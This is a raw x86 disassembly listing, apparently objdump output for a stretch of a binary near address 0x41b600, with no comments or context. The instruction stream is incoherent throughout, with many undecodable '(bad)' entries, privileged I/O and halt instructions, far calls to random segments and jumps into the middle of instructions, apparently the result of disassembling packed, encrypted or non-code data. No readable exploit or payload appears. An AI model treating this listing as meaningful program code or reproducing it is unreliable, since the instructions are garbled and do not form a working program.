  41b5f3:	loop   0x41b5f4
  41b5f5:	adc    eax,0xc90b9099
  41b5fa:	les    esp,FWORD PTR [ebx]
  41b5fc:	ins    DWORD PTR es:[edi],dx
  41b5fd:	imul   edi,DWORD PTR [ebx],0x4fe2a165
  41b603:	mov    DWORD PTR [ebx+ebp*4-0x143ef625],eax
  41b60a:	loopne 0x41b5b7
  41b60c:	adc    dl,ah
  41b60e:	and    DWORD PTR [ebp-0x4e],eax
  41b611:	(bad)  
  41b612:	(bad)  
  41b614:	sbb    DWORD PTR [edx],edi
  41b616:	popa   
  41b617:	test   BYTE PTR [esi-0x4b2c4233],al
  41b61d:	jae    0x41b64a
  41b61f:	or     eax,0x88a6d012
  41b624:	dec    ebp
  41b625:	test   esi,ebp
  41b627:	push   ss
  41b628:	xor    al,0xbe
  41b62a:	cmp    BYTE PTR [ecx],dl
  41b62c:	or     dl,BYTE PTR [edx]
  41b62e:	fisubr DWORD PTR [ebx-0x7f]
  41b631:	jb     0x41b66f
  41b633:	inc    edi
  41b634:	cld    
  41b635:	fstp   DWORD PTR [edx]
  41b637:	out    dx,eax
  41b638:	outs   dx,DWORD PTR ds:[esi]
  41b639:	ins    DWORD PTR es:[edi],dx
  41b63a:	and    eax,0x99b54379
  41b63f:	mov    bl,0x76
  41b641:	scas   al,BYTE PTR es:[edi]
  41b642:	lahf   
  41b643:	popf   
  41b644:	out    dx,eax
  41b645:	ds jmp 0x5b88:0x9c4c5458
  41b64d:	jle    0x41b619
  41b64f:	mov    bh,0xe7
  41b651:	mov    ds:0x53ab296c,al
  41b656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b657:	push   edx
  41b658:	call   0x488dab9c
  41b65d:	jbe    0x41b669
  41b65f:	and    al,0xa2
  41b661:	or     esi,DWORD PTR [edx+0x4b]
  41b664:	pop    esp
  41b665:	out    0xc5,eax
  41b667:	adc    ebp,ecx
  41b669:	imul   DWORD PTR [edx+esi*4-0x34]
  41b66d:	sub    eax,0xc07e3ae1
  41b672:	push   DWORD PTR cs:[edx-0x6105a10e]
  41b679:	sub    dh,0xd3
  41b67c:	loope  0x41b6cb
  41b67e:	inc    ebp
  41b67f:	xchg   ebx,eax
  41b680:	adc    al,0xca
  41b682:	adc    BYTE PTR [eax-0x37],ch
  41b685:	outs   dx,DWORD PTR ds:[esi]
  41b686:	sbb    DWORD PTR [ebp+0x30],esi
  41b689:	xchg   esp,eax
  41b68b:	inc    eax
  41b68c:	lea    edi,[esi]
  41b68e:	sub    DWORD PTR [eax+edi*4-0x633b89aa],esi
  41b695:	dec    edi
  41b696:	clc    
  41b697:	out    0x49,al
  41b699:	call   0xa8b3:0x2d6b6231
  41b6a0:	getsec 
  41b6a2:	shr    BYTE PTR [ecx],cl
  41b6a4:	cmp    BYTE PTR [esi],0xe4
  41b6a7:	(bad)  
  41b6a8:	iret   
  41b6a9:	(bad)  
  41b6aa:	into   
  41b6ab:	jo     0x41b648
  41b6ad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b6ae:	aas    
  41b6af:	jmp    0x41b6bc
  41b6b1:	jp     0x41b685
  41b6b3:	inc    eax
  41b6b4:	enter  0x69e2,0xef
  41b6b8:	out    dx,eax
  41b6b9:	dec    esp
  41b6ba:	cld    
  41b6bb:	test   eax,0x1b0144ab
  41b6c0:	jle    0x41b678
  41b6c2:	lahf   
  41b6c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b6c4:	cs xor edx,ecx
  41b6c7:	shr    DWORD PTR [edi+0x7ac43068],1
  41b6cd:	sub    ecx,DWORD PTR [esi-0x63]
  41b6d0:	mov    DWORD PTR [ecx-0x56],esi
  41b6d3:	je     0x41b670
  41b6d5:	pop    eax
  41b6d6:	or     al,0xd8
  41b6d8:	adc    eax,0x67e234d7
  41b6dd:	xor    eax,ecx
  41b6df:	add    eax,esi
  41b6e1:	jmp    0x41b916
  41b6e6:	int    0xd1
  41b6e8:	int    0xcf
  41b6ea:	rcl    ebx,1
  41b6ec:	int    0xd1
  41b6ee:	cmp    cl,BYTE PTR [ecx-0xb6c970a]
  41b6f4:	push   0x19
  41b6f6:	fsub   st,st(0)
  41b6f8:	jg     0x41b772
  41b6fa:	adc    BYTE PTR [esi+0x78],bh
  41b6fd:	js     0x41b710
  41b6ff:	enter  0xd54b,0x6a
  41b703:	push   0x5d440d2f
  41b708:	sbb    BYTE PTR [eax-0x57],ah
  41b70b:	and    BYTE PTR [edx-0x17],bh
  41b70e:	retf   0x7557
  41b711:	retf   0xeb67
  41b714:	jo     0x41b731
  41b716:	jp     0x41b771
  41b718:	or     ebx,DWORD PTR [edx+0x6f]
  41b71b:	lock mov ebp,0xba7c25f
  41b721:	inc    esi
  41b722:	mov    edi,DWORD PTR [eax-0x36]
  41b725:	jo     0x41b782
  41b727:	pushf  
  41b728:	sti    
  41b729:	jno    0x41b6f0
  41b72b:	aad    0x54
  41b72d:	pmuludq mm0,QWORD PTR [ecx-0x4a]
  41b731:	or     esi,edi
  41b733:	push   edx
  41b734:	arpl   WORD PTR [esi-0x6],di
  41b737:	mov    DWORD PTR [ebp+0x45475185],eax
  41b73d:	adc    ebx,esi
  41b73f:	pop    edi
  41b740:	or     esi,DWORD PTR [ebx+edi*2+0x20590352]
  41b747:	xchg   BYTE PTR [esi],dh
  41b749:	in     eax,dx
  41b74a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b74b:	cdq    
  41b74c:	and    ebp,edx
  41b74e:	popf   
  41b74f:	fbld   TBYTE PTR [esi]
  41b751:	jecxz  0x41b776
  41b753:	sbb    eax,0xb91563a
  41b758:	mov    esi,0xafa56ee4
  41b75d:	pop    eax
  41b75e:	mov    cl,0x9f
  41b760:	cmp    al,0x8e
  41b762:	div    DWORD PTR [ecx]
  41b764:	pop    ds
  41b765:	repnz and esi,DWORD PTR [esi+0x3b]
  41b769:	mov    ds:0x60cf5fea,al
  41b76e:	shl    al,1
  41b770:	inc    ecx
  41b771:	xchg   edx,eax
  41b772:	gs and eax,0xde801db7
  41b778:	std    
  41b779:	add    DWORD PTR [ebx+ecx*2+0x346c0f8d],ebx
  41b780:	jae    0x41b7c1
  41b782:	pop    edi
  41b783:	xchg   ecx,eax
  41b784:	popa   
  41b785:	js     0x41b7bd
  41b787:	data16 jle 0x41b7ba
  41b78a:	call   0xab8d:0xf024090c
  41b791:	adc    BYTE PTR [esp+edi*4],cl
  41b794:	ror    BYTE PTR [esi],cl
  41b796:	sub    edi,DWORD PTR [ecx-0x49]
  41b799:	rcl    DWORD PTR [eax],1
  41b79b:	push   esp
  41b79c:	sar    BYTE PTR [ebp+0x68],1
  41b79f:	rcr    BYTE PTR [edi],1
  41b7a1:	and    DWORD PTR [edx-0x7f],eax
  41b7a4:	push   ds
  41b7a5:	cwde   
  41b7a6:	dec    ebx
  41b7a7:	leave  
  41b7a8:	mov    ebx,fs
  41b7aa:	ss add al,0xf9
  41b7ad:	inc    edx
  41b7ae:	outs   dx,DWORD PTR ds:[esi]
  41b7af:	add    ecx,DWORD PTR [esi+0x30]
  41b7b2:	jae    0x41b80b
  41b7b4:	je     0x41b745
  41b7b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7b7:	or     BYTE PTR [eax+0x4c],0x93
  41b7bb:	jg     0x41b812
  41b7bd:	pop    eax
  41b7be:	mov    ds:0xf69c3186,eax
  41b7c3:	adc    al,0x8a
  41b7c5:	adc    ebp,eax
  41b7c7:	in     al,0x53
  41b7c9:	mov    al,0x54
  41b7cb:	jb     0x41b7b2
  41b7cd:	repz sub eax,0x9433ce3c
  41b7d3:	popa   
  41b7d4:	add    edi,eax
  41b7d6:	push   esp
  41b7d7:	out    dx,al
  41b7d8:	jb     0x41b791
  41b7da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b7db:	out    dx,al
  41b7dc:	test   esi,eax
  41b7de:	mov    ch,0x44
  41b7e0:	pop    ss
  41b7e1:	inc    ebx
  41b7e2:	je     0x41b7c2
  41b7e4:	dec    ecx
  41b7e5:	mov    ecx,0x4ded88d
  41b7ea:	icebp  
  41b7eb:	xlat   BYTE PTR ds:[ebx]
  41b7ec:	and    edx,DWORD PTR [ecx]
  41b7ee:	call   0x4398:0x3b2156d7
  41b7f5:	icebp  
  41b7f6:	test   eax,0xa03c9dca
  41b7fb:	xor    al,bl
  41b7fd:	retf   
  41b7fe:	fcomip st,st(4)
  41b800:	call   0xc555:0x1e433aee
  41b807:	push   0xf8bd2bdd
  41b80c:	adc    edx,ebp
  41b80e:	pop    ss
  41b80f:	cmp    eax,edi
  41b811:	jbe    0x41b828
  41b813:	jbe    0x41b88f
  41b815:	ja     0x41b865
  41b817:	fldcw  WORD PTR [ebp+0x2]
  41b81a:	dec    DWORD PTR [ecx-0x72]
  41b81d:	lds    eax,FWORD PTR [edi-0x4aa2b695]
  41b823:	jo     0x41b879
  41b825:	push   es
  41b826:	sub    ah,BYTE PTR [edi+0xa]
  41b829:	pop    ebp
  41b82a:	cmp    eax,DWORD PTR [eax]
  41b82c:	adc    DWORD PTR [edi+0x4d],ecx
  41b82f:	scas   al,BYTE PTR es:[edi]
  41b830:	push   edx
  41b831:	mul    DWORD PTR [edx+0xd6b246b]
  41b837:	xchg   edi,eax
  41b838:	or     BYTE PTR [ebx+0x30],0xd6
  41b83c:	retf   
  41b83d:	jl     0x41b816
  41b83f:	das    
  41b840:	lods   al,BYTE PTR ds:[esi]
  41b841:	icebp  
  41b842:	je     0x41b87b
  41b844:	shr    DWORD PTR [esi-0x16],0xdd
  41b848:	mov    DWORD PTR [ebx-0xe5384aa],0x24d95be9
  41b852:	sub    DWORD PTR [eax-0x4a],edi
  41b855:	fld    st(4)
  41b857:	xchg   esp,eax
  41b858:	inc    ebp
  41b859:	add    al,0x14
  41b85b:	sbb    BYTE PTR [ecx+0x1a],bl
  41b85e:	call   ecx
  41b860:	and    eax,ebp
  41b862:	(bad)  
  41b863:	push   ebp
  41b864:	mov    ds:0x4ad3b59b,eax
  41b869:	mov    dh,BYTE PTR [edx+0x28ea62fc]
  41b86f:	mov    ebx,0xe0edc4ba
  41b874:	bound  eax,QWORD PTR [edi+0x69af7c59]
  41b87a:	(bad)  
  41b87b:	xlat   BYTE PTR ds:[ebx]
  41b87c:	push   eax
  41b87d:	push   ecx
  41b87e:	test   al,0x73
  41b880:	aad    0xf
  41b882:	and    eax,0xc51bf80f
  41b887:	lea    ebp,[esi+0x7]
  41b88a:	or     DWORD PTR [eax],esi
  41b88c:	xor    DWORD PTR [eax],eax
  41b88e:	cdq    
  41b88f:	mov    dl,0x77
  41b891:	jg     0x41b857
  41b893:	cmp    esi,DWORD PTR [eax-0x4]
  41b896:	sub    BYTE PTR [ecx],cl
  41b898:	(bad)  
  41b899:	sti    
  41b89a:	or     esp,ecx
  41b89c:	pop    edi
  41b89d:	rol    ecx,0xf4
  41b8a0:	in     eax,dx
  41b8a1:	push   0x717dc5b4
  41b8a6:	(bad)  
  41b8a7:	loop   0x41b88a
  41b8a9:	fisubr WORD PTR [ecx-0x42c7df44]
  41b8af:	ss pop edi
  41b8b1:	and    al,BYTE PTR [ecx+edi*8-0x5d848632]
  41b8b8:	and    eax,0xb7f3373d
  41b8bd:	aam    0x4e
  41b8bf:	outs   dx,BYTE PTR ds:[esi]
  41b8c0:	(bad)  
  41b8c1:	xchg   ebp,eax
  41b8c2:	icebp  
  41b8c3:	jmp    0xd815f09e
  41b8c8:	dec    ecx
  41b8c9:	sub    esi,DWORD PTR [ebx+0x61ad5c0b]
  41b8cf:	xchg   ebx,eax
  41b8d0:	or     al,0xe6
  41b8d2:	in     al,dx
  41b8d3:	pop    edx
  41b8d4:	cmc    
  41b8d5:	fsub   DWORD PTR [edx+0x54]
  41b8d8:	inc    eax
  41b8d9:	add    eax,0x96b5fecb
  41b8de:	push   eax
  41b8df:	int    0xa7
  41b8e1:	jge    0x41b909
  41b8e3:	jle    0x41b914
  41b8e5:	sar    BYTE PTR [ecx],0x80
  41b8e8:	imul   BYTE PTR [ecx]
  41b8ea:	test   eax,0xe3666609
  41b8ef:	mov    al,ds:0xc455fb75
  41b8f4:	xor    eax,0x44eca988
  41b8f9:	pcmpeqd mm1,QWORD PTR [esi-0x10498d15]
  41b900:	xchg   BYTE PTR [esi-0x15],al
  41b903:	repnz fwait
  41b905:	and    al,0xba
  41b907:	repnz mov eax,0x8e143f26
  41b90d:	aas    
  41b90e:	imul   ebp,esi,0x4d
  41b911:	dec    esi
  41b912:	adc    ch,al
  41b914:	dec    esp
  41b915:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b916:	imul   eax,DWORD PTR [edx]
  41b919:	mov    edx,DWORD PTR [ebp-0x4]
  41b91c:	jmp    0x41bb51
  41b921:	(bad)  
  41b922:	retf   
  41b923:	xlat   BYTE PTR ds:[ebx]
  41b924:	vpsubusw xmm2,xmm4,xmm6
  41b928:	retf   
  41b929:	xor    esp,DWORD PTR [ecx+0x711d2136]
  41b92f:	imul   ebx,DWORD PTR [eax+0x787fe6f0],0x78787e10
  41b939:	aam    0xc2
  41b93b:	ins    BYTE PTR es:[edi],dx
  41b93c:	iret   
  41b93d:	push   cs
  41b93e:	cwde   
  41b93f:	aas    
  41b940:	and    BYTE PTR [eax-0x4228275f],ah
  41b946:	cdq    
  41b947:	ds xchg edi,eax
  41b949:	inc    ecx
  41b94a:	cs mov bl,0xec
  41b94d:	sbb    BYTE PTR [edi],cl
  41b94f:	sbb    eax,0x121ec24
  41b954:	cmc    
  41b955:	pop    esp
  41b956:	loope  0x41b960
  41b958:	mov    dl,0x62
  41b95a:	retf   
  41b95b:	adc    eax,0xb943d3bd
  41b960:	fist   WORD PTR [esi-0x4b]
  41b963:	jmp    0x118f590
  41b968:	inc    edx
  41b969:	push   ecx
  41b96a:	sti    
  41b96b:	mov    ch,0x89
  41b96d:	and    eax,0xe4ed0f4d
  41b972:	test   DWORD PTR [ecx+eax*8-0x20b3cad9],eax
  41b979:	pushf  
  41b97a:	scas   eax,DWORD PTR es:[edi]
  41b97b:	lods   eax,DWORD PTR ds:[esi]
  41b97c:	fadd   QWORD PTR [ecx*1-0x68af9a52]
  41b983:	pop    edi
  41b984:	xor    al,0x4
  41b986:	pop    ecx
  41b987:	dec    edi
  41b988:	mov    esi,0xb03c02d4
  41b98d:	inc    ecx
  41b98e:	mov    edx,0x1ca52676
  41b993:	outs   dx,BYTE PTR ds:[esi]
  41b994:	cmp    al,0x93
  41b996:	jmp    0x41b9b2
  41b998:	cs adc eax,0x6d7c06af
  41b99e:	das    
  41b99f:	adc    al,0xed
  41b9a1:	sub    dl,BYTE PTR [ebp-0x56]
  41b9a4:	in     eax,dx
  41b9a5:	sbb    DWORD PTR [edi],ebp
  41b9a7:	push   eax
  41b9a8:	das    
  41b9a9:	sub    eax,0x1c177e42
  41b9ae:	in     al,dx
  41b9af:	out    0xe8,al
  41b9b1:	inc    edx
  41b9b2:	xor    ebp,DWORD PTR [edi]
  41b9b4:	cmp    BYTE PTR [esi-0x3893a03],ah
  41b9ba:	(bad)  
  41b9bb:	jbe    0x41b9b3
  41b9bd:	mov    esi,DWORD PTR [ecx+0x50]
  41b9c0:	std    
  41b9c1:	inc    esi
  41b9c2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b9c3:	or     bh,BYTE PTR [ebx-0x60a4835d]
  41b9c9:	mov    bh,0xe5
  41b9cb:	xchg   ebp,eax
  41b9cc:	xchg   esp,eax
  41b9cd:	xor    ah,BYTE PTR [ebx-0x75]
  41b9d0:	scas   al,BYTE PTR es:[edi]
  41b9d1:	xor    eax,0xa9eaded4
  41b9d6:	or     al,0x0
  41b9d8:	pop    es
  41b9d9:	fnstcw WORD PTR [eiz*8+0x3ff9a105]
  41b9e0:	sahf   
  41b9e1:	mov    eax,0x84ed38fe
  41b9e6:	push   cs
  41b9e7:	or     ecx,DWORD PTR [eax]
  41b9e9:	jg     0x41b9ae
  41b9eb:	dec    esp
  41b9ec:	scas   al,BYTE PTR es:[edi]
  41b9ed:	cmp    eax,0x1af4c0cf
  41b9f2:	xor    ecx,edx
  41b9f4:	aad    0xc8
  41b9f6:	mov    eax,ds:0xd81ca889
  41b9fb:	pop    eax
  41b9fc:	fcmovu st,st(4)
  41b9fe:	pop    ss
  41b9ff:	mov    dh,BYTE PTR [ebx+eiz*8]
  41ba02:	push   ebx
  41ba03:	push   0x11330e1b
  41ba08:	mov    ecx,0x26ecd4a6
  41ba0d:	add    al,0xe1
  41ba0f:	fadd   QWORD PTR [edx*8+0x7a868c87]
  41ba16:	lahf   
  41ba17:	xor    al,0xf9
  41ba19:	xor    DWORD PTR [ecx-0xa],eax
  41ba1c:	imul   ebx,DWORD PTR [edi],0x71cbe72
  41ba22:	push   ebx
  41ba23:	lea    edx,[eax-0x268ad8bb]
  41ba29:	jge    0x41ba56
  41ba2b:	test   al,0xa1
  41ba2d:	or     eax,0x17c37719
  41ba32:	neg    DWORD PTR [edx]
  41ba34:	push   dx
  41ba36:	out    dx,al
  41ba37:	xor    al,0x2d
  41ba39:	xchg   esi,eax
  41ba3a:	cmp    DWORD PTR [ebp+0x7ea2e47e],0x135eae90
  41ba44:	pop    ss
  41ba45:	cld    
  41ba46:	pop    es
  41ba47:	fiadd  WORD PTR [edx-0x27955632]
  41ba4d:	in     al,dx
  41ba4e:	pop    ds
  41ba4f:	mov    dh,0x8b
  41ba51:	aaa    
  41ba52:	icebp  
  41ba53:	hlt    
  41ba54:	loop   0x41bacf
  41ba56:	lods   al,BYTE PTR ds:[esi]
  41ba57:	jno    0x41ba6d
  41ba59:	fwait
  41ba5a:	loop   0x41ba05
  41ba5c:	sbb    bl,ah
  41ba5e:	inc    edi
  41ba5f:	arpl   WORD PTR [eax-0x1d646f9a],cx
  41ba65:	cmp    DWORD PTR [eax+0x7d7bf0d9],eax
  41ba6b:	inc    ebp
  41ba6c:	dec    ecx
  41ba6d:	xchg   ecx,eax
  41ba6e:	jns    0x41bada
  41ba70:	cmp    BYTE PTR [eax+0xbddc0a2],0x22
  41ba77:	mov    eax,ds:0xa6b1b89c
  41ba7c:	jge    0x41ba20
  41ba7e:	icebp  
  41ba7f:	ret    0xcb48
  41ba82:	sub    esi,DWORD PTR ds:0x96f5f4c8
  41ba88:	add    ebp,DWORD PTR [ecx]
  41ba8a:	mov    ds:0x465cc224,eax
  41ba8f:	cwde   
  41ba90:	inc    esp
  41ba91:	(bad)  
  41ba92:	mov    eax,DWORD PTR [ecx-0x64]
  41ba95:	test   eax,0xd525ffda
  41ba9a:	xchg   ebx,eax
  41ba9b:	out    0x8e,al
  41ba9d:	mov    ds:0x96742b02,al
  41baa2:	or     al,0xf3
  41baa4:	push   ebp
  41baa5:	adc    al,BYTE PTR [esi+0x2e36d319]
  41baab:	pushf  
  41baac:	js     0x41bb03
  41baae:	data16 loopne 0x41baeb
  41bab1:	pop    ebp
  41bab2:	or     ecx,DWORD PTR [edi]
  41bab4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bab5:	xor    DWORD PTR [esi+0x5332985a],ebp
  41babb:	iret   
  41babc:	xchg   esp,eax
  41babd:	icebp  
  41babe:	sti    
  41babf:	lahf   
  41bac0:	ins    BYTE PTR es:[edi],dx
  41bac1:	pop    ss
  41bac2:	dec    ebx
  41bac3:	fmul   QWORD PTR [ebx+0x2e138fe6]
  41bac9:	pop    eax
  41baca:	test   DWORD PTR [edx+0x2d5210af],ebp
  41bad0:	sub    eax,0x5287941b
  41bad5:	cld    
  41bad6:	into   
  41bad7:	push   ebp
  41bad8:	mov    edx,0x7788cc
  41badd:	mov    gs,WORD PTR [esi-0x7ec1150e]
  41bae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bae4:	mov    edi,0xc904431
  41bae9:	loope  0x41ba9d
  41baeb:	mov    al,ds:0x43e3631
  41baf0:	ins    BYTE PTR es:[edi],dx
  41baf1:	xor    cl,dh
  41baf3:	ss ds sti 
  41baf6:	call   0xaecfa210
  41bafb:	or     al,0xef
  41bafd:	mov    eax,0x795a7fd0
  41bb02:	lock and BYTE PTR ds:0xf4b105a7,0x5
  41bb0a:	int3   
  41bb0b:	fild   QWORD PTR gs:[esi]
  41bb0e:	cli    
  41bb0f:	inc    edx
  41bb10:	addr16 xor al,0xd
  41bb13:	push   ebx
  41bb14:	xor    DWORD PTR [edi+0x4885a0be],esp
  41bb1a:	sti    
  41bb1b:	sub    al,0xb5
  41bb1d:	jecxz  0x41bb79
  41bb1f:	mov    ebp,0x9f7b3b4
  41bb24:	fcom   DWORD PTR [esi+0x2f22274]
  41bb2a:	mov    edx,0x3782d8ff
  41bb2f:	imul   edi,DWORD PTR [edx-0x76],0xf
  41bb33:	push   edx
  41bb34:	repnz icebp 
  41bb36:	nop
  41bb37:	and    ebp,DWORD PTR [esi]
  41bb39:	sub    esp,DWORD PTR [eax-0x42]
  41bb3c:	sbb    ch,BYTE PTR [edx+0x6bcfd3fd]
  41bb42:	cwde   
  41bb43:	or     DWORD PTR [eax+0x7ce30939],edi
  41bb49:	xchg   BYTE PTR [ecx],al
  41bb4b:	retf   0x7acf
  41bb4e:	push   esi
  41bb4f:	loopne 0x41bb16
  41bb51:	xor    edx,ecx
  41bb53:	jmp    0x41bd88
  41bb58:	enter  0xcfcf,0xc7
  41bb5c:	iret   
  41bb5d:	(bad)  
  41bb5e:	rcl    bh,1
  41bb60:	mov    esi,0xc317bf12
  41bb65:	fld    TBYTE PTR [edx-0x68]
  41bb68:	mov    ah,ah
  41bb6a:	jg     0x41bbe4
  41bb6c:	adc    BYTE PTR [esi+0x78],bh
  41bb6f:	js     0x41bb48
  41bb71:	js     0x41bb5e
  41bb73:	adc    eax,0x1e2d08a6
  41bb78:	call   0xf160ee89
  41bb7d:	push   eax
  41bb7e:	icebp  
  41bb7f:	popf   
  41bb80:	daa    
  41bb81:	cli    
  41bb82:	ja     0x41bb79
  41bb84:	adc    esp,ecx
  41bb86:	inc    esp
  41bb87:	cli    
  41bb88:	fsub   QWORD PTR [ebp+0x39]
  41bb8b:	mov    cl,0x86
  41bb8d:	pop    ss
  41bb8e:	lahf   
  41bb8f:	std    
  41bb90:	xchg   eax,edi
  41bb92:	lds    eax,FWORD PTR [esi]
  41bb94:	add    BYTE PTR [ecx+0x17122545],al
  41bb9a:	mov    edx,0x3cf8e48f
  41bb9f:	int3   
  41bba0:	pop    ds
  41bba1:	call   0x1ba2:0x3d9b7263
  41bba8:	pop    edx
  41bba9:	sbb    al,0x54
  41bbab:	dec    ebp
  41bbac:	cmp    BYTE PTR [esi+0x63590e59],al
  41bbb2:	jmp    0xf745b0a1
  41bbb7:	pop    es
  41bbb8:	mov    ecx,0x46ce92fe
  41bbbd:	push   0x4a
  41bbbf:	mov    ds,WORD PTR [edx]
  41bbc1:	pop    es
  41bbc2:	xchg   edx,eax
  41bbc3:	rol    DWORD PTR [ecx],1
  41bbc5:	xchg   ebx,eax
  41bbc6:	pop    DWORD PTR [ebx-0x3f]
  41bbc9:	jl     0x41bb4d
  41bbcb:	mov    DWORD PTR [si],eax
  41bbce:	ja     0x41bb95
  41bbd0:	dec    eax
  41bbd1:	mov    BYTE PTR [esi+0x69],dh
  41bbd4:	or     BYTE PTR [ebx],al
  41bbd6:	scas   eax,DWORD PTR es:[edi]
  41bbd7:	sbb    esi,DWORD PTR [edi+0x5ffc418]
  41bbdd:	loop   0x41bb6e
  41bbdf:	aam    0x9e
  41bbe1:	pop    ds
  41bbe2:	dec    esp
  41bbe3:	mov    ds:0xc27f33aa,eax
  41bbe8:	(bad)  
  41bbe9:	neg    DWORD PTR [ecx-0x3f10b58a]
  41bbef:	je     0x41bc57
  41bbf1:	(bad)  
  41bbf2:	or     dl,BYTE PTR [esi+0x76]
  41bbf5:	inc    esp
  41bbf6:	hlt    
  41bbf7:	cdq    
  41bbf8:	inc    edx
  41bbf9:	ds or  eax,0x41b46b6f
  41bbff:	and    bl,BYTE PTR [ebx]
  41bc01:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc02:	mov    eax,0x3e652f33
  41bc07:	pushf  
  41bc08:	mov    al,0x39
  41bc0a:	adc    al,0xe
  41bc0c:	jo     0x41bbd0
  41bc0e:	mov    ds:0xcd7fa575,al
  41bc13:	pushf  
  41bc14:	das    
  41bc15:	mov    edx,0x3fca6808
  41bc1a:	dec    ecx
  41bc1b:	or     al,0xa
  41bc1d:	jmp    0x41bbcc
  41bc1f:	pop    ds
  41bc20:	popa   
  41bc21:	xor    esp,esi
  41bc23:	imul   edx,DWORD PTR [eax+0x37],0x65
  41bc27:	imul   ebx,DWORD PTR [eax],0xffffffa8
  41bc2a:	call   0x7b4a:0x301d36ba
  41bc31:	(bad)  
  41bc32:	in     eax,dx
  41bc33:	aas    
  41bc34:	jmp    DWORD PTR [ebx+edi*8+0x36]
  41bc38:	int    0x37
  41bc3a:	add    eax,0xc917a6c4
  41bc3f:	loope  0x41bc93
  41bc41:	in     eax,dx
  41bc42:	lock mov DWORD PTR [edi-0x49],0x5236ee0b
  41bc4a:	mov    eax,ds:0x5d84e9f2
  41bc4f:	and    DWORD PTR [edi],0x2f
  41bc52:	inc    esp
  41bc53:	xor    eax,0xf34183fe
  41bc58:	jge    0x41bc24
  41bc5a:	call   0x3514:0x9947
  41bc60:	add    esp,DWORD PTR [ecx]
  41bc62:	mov    edx,0x23d1a3fd
  41bc67:	push   0x95762e8e
  41bc6c:	push   0x77fdc9aa
  41bc71:	test   DWORD PTR [ecx-0x187d636b],edi
  41bc77:	xchg   ebx,eax
  41bc78:	stos   DWORD PTR es:[edi],eax
  41bc79:	mov    dl,0xfd
  41bc7b:	cmp    bh,BYTE PTR [ecx+0x4a08496e]
  41bc81:	add    eax,0x8a0500a9
  41bc86:	sub    al,0x15
  41bc88:	sbb    BYTE PTR [ebx],al
  41bc8a:	push   esp
  41bc8b:	js     0x41bc82
  41bc8d:	sub    dh,cl
  41bc8f:	retf   
  41bc90:	out    dx,al
  41bc91:	aad    0xee
  41bc93:	cwde   
  41bc94:	mov    ds:0xc2686c8b,eax
  41bc99:	inc    esp
  41bc9a:	lds    eax,FWORD PTR [esi]
  41bc9c:	js     0x41bcad
  41bc9e:	daa    
  41bc9f:	mov    eax,0x864bbe9
  41bca4:	adc    BYTE PTR [esi],dl
  41bca6:	ins    DWORD PTR es:[edi],dx
  41bca7:	dec    eax
  41bca8:	sbb    BYTE PTR [ebp+0x43],dh
  41bcab:	clc    
  41bcac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bcad:	cmc    
  41bcae:	mov    dl,0x3b
  41bcb0:	jmp    0x37d3:0x6e6d9533
  41bcb7:	rol    DWORD PTR [esp+ecx*8],1
  41bcba:	leave  
  41bcbb:	xchg   ebx,eax
  41bcbc:	pop    ebx
  41bcbd:	(bad)  
  41bcbe:	shl    DWORD PTR [eax],0xad
  41bcc1:	jmp    0x7ed998b3
  41bcc6:	cmp    DWORD PTR [edi+ecx*4],esp
  41bcc9:	stos   BYTE PTR es:[di],al
  41bccb:	call   0x8486:0xb389c0a6
  41bcd2:	cmp    edx,eax
  41bcd4:	sahf   
  41bcd5:	pop    ds
  41bcd6:	ret    
  41bcd7:	cmp    ch,dl
  41bcd9:	or     BYTE PTR [edx],0xa6
  41bcdc:	jnp    0x41bc73
  41bcde:	dec    esp
  41bcdf:	dec    edx
  41bce0:	repz fadd DWORD PTR [ecx-0x63a7c8b8]
  41bce7:	push   ss
  41bce8:	adc    eax,0xc828af80
  41bced:	push   ds
  41bcee:	loop   0x41bd58
  41bcf0:	dec    esi
  41bcf1:	pop    esp
  41bcf2:	rcr    DWORD PTR [ebp+eax*8-0x17],cl
  41bcf6:	pop    esi
  41bcf7:	dec    ebx
  41bcf8:	dec    esi
  41bcf9:	sub    DWORD PTR [edi],ebp
  41bcfb:	and    eax,0x75910891
  41bd00:	hlt    
  41bd01:	outs   dx,BYTE PTR ds:[esi]
  41bd02:	ss dec edi
  41bd04:	add    bl,BYTE PTR gs:[ebx-0x19]
  41bd08:	and    bl,cl
  41bd0a:	fidiv  DWORD PTR [ebx-0x6f]
  41bd0d:	mov    eax,0x759bcca2
  41bd12:	add    DWORD PTR [ecx-0x53694f58],eax
  41bd18:	jb     0x41bcc5
  41bd1a:	inc    edi
  41bd1b:	dec    esp
  41bd1c:	jg     0x41bcfb
  41bd1e:	lahf   
  41bd1f:	ret    
  41bd20:	retf   
  41bd21:	fst    st(5)
  41bd23:	and    BYTE PTR [edi],ah
  41bd25:	xchg   esi,eax
  41bd26:	and    edi,DWORD PTR [ecx]
  41bd28:	adc    ah,BYTE PTR [ebp-0x10]
  41bd2b:	mov    esp,0xb53b1d74
  41bd30:	jae    0x41bd76
  41bd32:	mov    esp,0x205b5f1a
  41bd37:	es pusha 
  41bd39:	popf   
  41bd3a:	cmp    BYTE PTR [ebx-0x3ac1b837],0x43
  41bd41:	div    DWORD PTR [ecx-0x3f0579d3]
  41bd47:	test   cl,al
  41bd49:	cdq    
  41bd4a:	mov    esi,0xb2635cc9
  41bd4f:	or     cl,BYTE PTR [ecx]
  41bd51:	cs scas eax,DWORD PTR es:[edi]
  41bd53:	lea    ebp,[esi-0x13ec774b]
  41bd59:	xchg   esp,eax
  41bd5a:	addr16 into 
  41bd5c:	mov    eax,ds:0x761ed9ef
  41bd61:	inc    ecx
  41bd62:	xor    esi,DWORD PTR [ecx]
  41bd64:	cmp    BYTE PTR [edx],ch
  41bd66:	sub    esi,DWORD PTR [eax+eax*8+0x330aa3d2]
  41bd6d:	xor    ch,cl
  41bd6f:	push   ebp
